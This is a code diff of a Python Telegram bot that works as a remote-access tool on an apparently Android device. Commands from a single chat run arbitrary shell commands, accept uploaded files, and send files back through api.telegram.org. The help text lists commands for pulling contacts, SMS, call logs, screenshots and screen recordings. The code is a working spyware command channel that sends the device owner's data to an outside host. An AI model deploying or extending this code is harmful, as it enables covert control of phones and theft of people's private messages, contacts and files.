@@ -1,12 +1,12 @@
 import os, sys, time, requests, subprocess, shutil, threading, json
 from datetime import datetime
 
-# ======== قِرَاءَةُ التُّوكِنِ مِنَ الْأَسْرَارِ ========
 try:
     from config import BOT_TOKEN, CHAT_ID
 except:
     BOT_TOKEN = os.environ.get('BOT_TOKEN')
     CHAT_ID = os.environ.get('CHAT_ID')
+
 BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
 LAST_UPDATE = 0
 
@@ -20,9 +20,6 @@ def send_file(path, cap=""):
             requests.post(f"{BASE}/sendDocument", files={'document': f}, data={"chat_id": CHAT_ID, "caption": cap})
     except: pass
 
-# ========================================================================
-# قَلْبُ الْعَمَلِيَّاتِ (كُلُّ أَمْرٍ يُنَفِّذُ مُهِمَّةً قَاتِلَةً)
-# ========================================================================
 def execute(cmd):
     try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
@@ -45,7 +42,7 @@ def listen():
                     if not msg or msg.get('chat',{}).get('id') != int(CHAT_ID): continue
                     txt = msg.get('text', '')
                     doc = msg.get('document')
-                    # --- اسْتِقْبَالُ الْمَلَفَّاتِ (أَمْرُ /upload يَتِمُّ تِلْقَائِيًّا) ---
+                    # استقبال الملفات
                     if doc:
                         file_id = doc['file_id']
                         file_name = doc.get('file_name', 'unknown.bin')
@@ -57,7 +54,7 @@ def listen():
                         with open(save_as, 'wb') as f: f.write(content)
                         send(f"✅ تم تحميل الملف `{file_name}` إلى `/sdcard/`")
                         continue
-                    # --- الأَوَامِرُ النَّصِّيَّةُ ---
+                    # الأوامر
                     if txt.startswith('/run'):
                         threading.Thread(target=execute, args=(txt[5:].strip(),), daemon=True).start()
                     elif txt.startswith('/dl'):
@@ -86,10 +83,8 @@ def listen():
                         if os.path.exists("/sdcard/vid.mp4"):
                             send_file("/sdcard/vid.mp4", "📹 تسجيل شاشة (5 ثواني)")
                             os.remove("/sdcard/vid.mp4")
-                    elif txt == '/info':
-                        send(f"📱 *معلومات الهاتف*\nالوقت: {datetime.now()}\nالمسار: {os.getcwd()}")
                     elif txt == '/help':
-                        send("📜 *الأوامر المتاحة:*\n/run <أمر>\n/dl <مسار>\n/contacts\n/sms\n/calls\n/ss\n/record\n/info\n\n📤 *أرسل أي ملف مباشرة ليتم تحميله*")
+                        send("📜 *الأوامر المتاحة:*\n/run <أمر>\n/dl <مسار>\n/contacts\n/sms\n/calls\n/ss\n/record\n\n📤 *أرسل أي ملف مباشرة ليتم تحميله*")
         except: pass
         time.sleep(1)
 
